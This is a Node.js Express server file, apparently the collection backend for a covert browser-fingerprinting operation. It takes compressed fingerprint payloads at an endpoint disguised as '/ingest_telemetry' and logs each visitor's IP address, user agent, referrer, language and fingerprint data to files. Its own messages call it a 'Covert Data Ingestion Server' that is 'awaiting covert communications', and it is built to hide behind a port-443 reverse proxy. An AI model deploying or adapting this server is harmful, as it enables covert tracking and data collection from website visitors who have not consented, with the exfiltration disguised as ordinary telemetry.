// server.js
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const zlib = require('zlib');

const app = express();
const port = 3001; // Node.js listens here; Nginx proxies from 443.

// CORS Configuration
// **CRITICAL**: Replace with your domain to restrict access.
app.use((req, res, next) => {
    const allowedOrigin = 'https://test-page-xy7.pages.dev'; // EDIT THIS
    const origin = req.headers.origin;
    if (origin && origin === allowedOrigin) {
        res.setHeader('Access-Control-Allow-Origin', allowedOrigin);
        res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type, User-Agent, X-Requested-With, Content-Encoding');
    }
    if (req.method === 'OPTIONS') {
        return res.sendStatus(204);
    }
    next();
});

// Parse raw binary data for compressed payloads
app.use(bodyParser.raw({ type: 'application/octet-stream', limit: '5mb' }));

const fingerprintLogPath = path.join(__dirname, 'collected_fingerprints.log');
const errorLogPath = path.join(__dirname, 'client_errors.log');

// Safely append to log files
function appendToLog(logFile, data) {
    fs.appendFile(logFile, JSON.stringify(data) + '\n', (err) => {
        if (err) console.error(`Failed to write to ${logFile}:`, err);
    });
}

// Fingerprint ingestion endpoint
app.post('/ingest_telemetry', (req, res) => {
    const rawHeaders = req.headers;
    const clientIp = req.ip || req.connection.remoteAddress || req.socket.remoteAddress;

    let decompressedData = null;
    if (rawHeaders['content-encoding'] === 'gzip' && req.body instanceof Buffer) {
        try {
            decompressedData = zlib.gunzipSync(req.body).toString('utf8');
            decompressedData = JSON.parse(decompressedData);
        } catch (e) {
            console.error('Error decompressing/parsing gzipped payload:', e);
            return res.status(400).send('Bad Request: Invalid gzipped payload');
        }
    } else {
        if (!req.body) return res.status(400).send('Bad Request: No payload received');
        try {
            decompressedData = JSON.parse(req.body.toString('utf8'));
        } catch (e) {
            console.error('Error parsing uncompressed payload:', e);
            return res.status(400).send('Bad Request: Invalid uncompressed payload');
        }
    }

    const collectedRecord = {
        timestamp: new Date().toISOString(),
        clientIp,
        userAgentHeader: rawHeaders['user-agent'],
        referrer: rawHeaders['referer'],
        acceptLanguage: rawHeaders['accept-language'],
        collectedData: decompressedData
    };

    console.log(`\n--- Fingerprint Ingested: ${collectedRecord.timestamp} from ${collectedRecord.clientIp} ---`);
    appendToLog(fingerprintLogPath, collectedRecord);
    res.status(200).send();
});

// Client error logging endpoint
app.post('/log_error', (req, res) => {
    const errorInfo = {
        timestamp: new Date().toISOString(),
        clientIp: req.ip || req.connection.remoteAddress,
        rawBody: req.body.toString(),
        error: null
    };
    try {
        errorInfo.error = JSON.parse(req.body.toString('utf8'));
        delete errorInfo.rawBody;
    } catch (e) {
        console.error('Failed to parse client error log body:', e);
    }

    console.warn(`\n!!! Client Error Logged: ${errorInfo.timestamp} from ${errorInfo.clientIp} !!!`);
    appendToLog(errorLogPath, errorInfo);
    res.status(200).send();
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.status(200).send('Server is healthy and awaiting covert communications.');
});

app.listen(port, () => {
    console.log(`\n😈 Covert Data Ingestion Server running on port ${port}`);
    console.log(`Fingerprint logs: ${path.resolve(fingerprintLogPath)}`);
    console.log(`Client error logs: ${path.resolve(errorLogPath)}\n`);
    console.log(`Listening for fingerprints at POST /ingest_telemetry`);
    console.log(`Listening for client errors at POST /log_error`);
    console.log(`Use a reverse proxy (e.g., Nginx) from port 443 to ${port}!\n`);
});
